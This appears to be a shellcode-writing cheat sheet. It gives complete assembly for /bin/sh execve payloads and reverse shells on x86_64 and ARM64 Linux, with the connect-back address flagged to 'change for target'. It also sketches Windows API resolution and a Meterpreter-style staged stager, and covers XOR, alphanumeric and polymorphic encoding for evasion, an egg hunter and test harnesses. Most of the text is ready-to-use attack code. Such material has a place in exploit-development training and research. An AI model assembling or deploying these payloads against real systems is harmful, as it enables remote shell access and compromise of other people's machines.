# Shellcode Development

## x86_64 Linux

### execve /bin/sh (Null-Free, 27 bytes)
```nasm
; execve("/bin/sh", NULL, NULL)
global _start
_start:
    xor rsi, rsi          ; argv = NULL
    push rsi              ; null terminator on stack
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" (little-endian)
    push rdi
    mov rdi, rsp          ; rdi = pointer to "/bin/sh"
    xor rdx, rdx          ; envp = NULL
    mov al, 59            ; syscall 59 = execve
    syscall
```

### Reverse Shell (x86_64 Linux, ~74 bytes)
```nasm
; socket → connect → dup2 × 3 → execve
global _start
_start:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    xor rsi, rsi
    mul rsi               ; rax=0, rdx=0
    inc esi               ; SOCK_STREAM
    push 2
    pop rdi               ; AF_INET
    mov al, 41            ; socket
    syscall
    mov r12, rax          ; save sockfd

    ; connect(sockfd, &addr, 16)
    push rdx              ; padding
    mov dword [rsp], 0x0100007f  ; 127.0.0.1 (change for target)
    push word 0x5c11      ; port 4444 (0x115c big-endian)
    push word 2           ; AF_INET
    mov rsi, rsp          ; &sockaddr
    push 16
    pop rdx               ; addrlen
    mov rdi, r12          ; sockfd
    mov al, 42            ; connect
    syscall

    ; dup2(sockfd, 0/1/2)
    xor rsi, rsi
    mov rdi, r12
.dup_loop:
    mov al, 33            ; dup2
    syscall
    inc esi
    cmp esi, 3
    jne .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

### Bind Shell (x86_64 Linux)
```nasm
; socket → bind → listen → accept → dup2 → execve
; Similar to reverse shell but:
; bind(sockfd, &addr, 16)  — syscall 49
; listen(sockfd, 0)        — syscall 50
; accept(sockfd, NULL, NULL) — syscall 43
; Then dup2 on accepted fd (not original sockfd)
```

## ARM64 Linux

### execve /bin/sh (Null-Free)
```nasm
.global _start
_start:
    // Build "/bin/sh\0" on stack
    mov x1, #0x6873        // "sh"
    movk x1, #0x2f6e, lsl #16  // "n/"
    movk x1, #0x6962, lsl #32  // "bi"
    movk x1, #0x2f, lsl #48    // "/"
    str x1, [sp, #-16]!
    mov x0, sp             // x0 = "/bin/sh"
    mov x1, xzr            // argv = NULL
    mov x2, xzr            // envp = NULL
    mov x8, #221           // execve
    svc #0
```

### Reverse Shell (ARM64 Linux)
```nasm
.global _start
_start:
    // socket(2, 1, 0)
    mov x0, #2
    mov x1, #1
    mov x2, xzr
    mov x8, #198
    svc #0
    mov x12, x0            // save sockfd

    // connect
    mov x1, sp
    mov w2, #0x5c110002    // AF_INET + port 4444
    str w2, [x1]
    mov w2, #0x0100007f    // 127.0.0.1
    str w2, [x1, #4]
    mov x2, #16
    mov x0, x12
    mov x8, #203           // connect
    svc #0

    // dup2 loop
    mov x0, x12
    mov x1, xzr
dup_loop:
    mov x8, #24            // dup3
    svc #0
    add x1, x1, #1
    cmp x1, #3
    blt dup_loop

    // execve
    adr x0, sh
    mov x1, xzr
    mov x2, xzr
    mov x8, #221
    svc #0
sh: .ascii "/bin/sh\0"
```

## Windows Shellcode (x64)

### WinExec("cmd.exe", 0)
```nasm
; Resolve kernel32.dll base via PEB
; PEB → Ldr → InMemoryOrderModuleList → kernel32.dll base
; Then resolve WinExec by walking export table

; PEB access:
mov rax, [gs:0x60]        ; PEB
mov rax, [rax+0x18]       ; PEB->Ldr
mov rax, [rax+0x20]       ; InMemoryOrderModuleList.Flink (ntdll)
mov rax, [rax]            ; next (kernel32 or kernelbase)
mov rax, [rax]            ; next (kernel32)
mov rbx, [rax+0x20]      ; DllBase (kernel32.dll base)

; Walk export table to find WinExec
; Hash-based lookup is standard (ROR13 hash of function name)
```

### Staged Shellcode (Meterpreter Pattern)
```
; Stage 0 (small, fits in exploit): connect back, receive stage 1
; 1. WSAStartup
; 2. socket + connect to C2
; 3. recv(sock, rwx_buffer, large_size)
; 4. jmp rwx_buffer (execute stage 1)

; Stage 1 (large, received over network): full payload
; Reflective DLL injection, Meterpreter, etc.
```

## Encoding & Evasion

### XOR Encoder
```python
# Simple XOR encoder (avoid bad bytes)
def xor_encode(shellcode, key):
    encoded = bytes([b ^ key for b in shellcode])
    # Verify no bad bytes in encoded output
    bad_bytes = b'\x00\x0a\x0d'
    if any(b in encoded for b in bad_bytes):
        return None  # try different key
    return encoded

# Decoder stub (prepended to encoded shellcode):
# Knows length and key, XORs in-place, then falls through to decoded shellcode
```

### Alphanumeric Shellcode
```
# Only uses bytes 0x30-0x39, 0x41-0x5a, 0x61-0x7a
# Useful when input is filtered to printable ASCII
# Tools: alpha2, msfvenom -e x64/alpha_mixed
# Significant size increase (~4-5x)
```

### Polymorphic Shellcode
```python
# Each generation looks different but does the same thing
# Techniques:
# 1. Random NOP equivalents (xchg reg,reg; lea reg,[reg+0]; etc.)
# 2. Instruction substitution (mov rax,0 → xor rax,rax → sub rax,rax)
# 3. Register reassignment (use different registers each time)
# 4. Garbage instruction insertion (dead code between real ops)
# 5. Reorder independent instructions
```

## Bad Byte Avoidance

### Common Bad Bytes
```
# \x00 — null (string terminator)
# \x0a — newline (line-based input)
# \x0d — carriage return
# \x20 — space (argument separator)
# \x09 — tab
# \xff — sometimes filtered

# Avoidance techniques:
# XOR encoding with decoder stub
# Instruction substitution:
#   mov rax, 0 → xor rax, rax
#   push 0x00000041 → push 0x41414141; shr dword [rsp], 24
# Split operations:
#   mov rax, 0x0068732f → mov eax, 0x01697430; sub eax, 0x01010101
```

### Null-Free Techniques
```nasm
; Instead of: mov rax, 0 (contains 00 bytes in immediate)
xor rax, rax              ; null-free

; Instead of: mov rax, small_value (zero-extended, has null bytes)
xor rax, rax
mov al, value             ; only sets low byte

; Instead of: push 0 (pushes 8 bytes of zeros)
xor rax, rax
push rax

; String building without nulls:
; "/bin/sh\0" — push null first, then string
xor rax, rax
push rax                  ; null terminator
mov rax, 0x68732f6e69622f ; "/bin/sh" (no null in this value)
push rax
```

## Shellcode Testing

### Quick Test Harness (C)
```c
// Compile: gcc -z execstack -o test test.c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = "\x48\x31\xf6...";  // your shellcode

int main() {
    void *exec = mmap(NULL, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

### Python Test with pwntools
```python
from pwn import *

context.arch = 'amd64'  # or 'aarch64'

shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
''')

# Test locally
p = run_shellcode(shellcode)
p.interactive()

# Or: check for bad bytes
assert b'\x00' not in shellcode, "Contains null bytes!"
print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Hex: {shellcode.hex()}")
```

## Stagers & Egg Hunters

### Egg Hunter (x86_64, ~30 bytes)
```nasm
; Search memory for 8-byte egg marker, then jump to shellcode after it
; Useful when: small buffer for initial exploit, large shellcode elsewhere in memory

; Egg: 0x50905090 repeated (unlikely to occur naturally)
xor rdi, rdi
mov r8, 0x5090509050905090  ; egg (doubled)

next_page:
    or di, 0xfff          ; align to page boundary
next_addr:
    inc rdi
    ; Check if address is readable (syscall won't crash on bad addr)
    lea rsi, [rdi+4]
    xor rax, rax
    mov al, 21            ; access() syscall
    xor rdx, rdx
    syscall
    cmp al, 0xf2          ; EFAULT = bad page
    je next_page
    ; Check for egg
    cmp [rdi], r8
    jne next_addr
    ; Found! Jump past egg
    lea rax, [rdi+8]
    jmp rax
```

### Staged Download + Execute
```python
# Stage 0: download stage 1 from URL
# Useful for: size-constrained exploits, dynamic payloads

# Linux: use syscalls to connect + recv
# Windows: URLDownloadToFile or WinHTTP API calls
# Size: ~150-300 bytes depending on platform
```

## Tools

| Tool | Purpose |
|------|---------|
| pwntools (shellcraft) | Shellcode generation library |
| msfvenom | Metasploit payload generator |
| Keystone | Multi-arch assembler |
| Capstone | Multi-arch disassembler |
| nasm / as | Native assemblers |
| objdump -d | Disassemble compiled shellcode |
| strace | Trace shellcode syscalls |
| Unicorn Engine | Emulate shellcode execution |
| alpha2 / ALPHA3 | Alphanumeric encoder |
| shellnoob | Shellcode writing helper |

## Extraction from Binary

```bash
# Compile assembly to raw shellcode
nasm -f elf64 shell.asm -o shell.o
ld -o shell shell.o
objcopy -O binary -j .text shell shell.bin
xxd -i shell.bin  # C array format

# Or with pwntools:
python3 -c "from pwn import *; context.arch='amd64'; print(asm(open('shell.asm').read()).hex())"

# Check for bad bytes:
python3 -c "
sc = open('shell.bin','rb').read()
bad = [i for i,b in enumerate(sc) if b in [0x00,0x0a,0x0d]]
print(f'Bad bytes at offsets: {bad}' if bad else 'Clean!')
print(f'Length: {len(sc)} bytes')
"
```
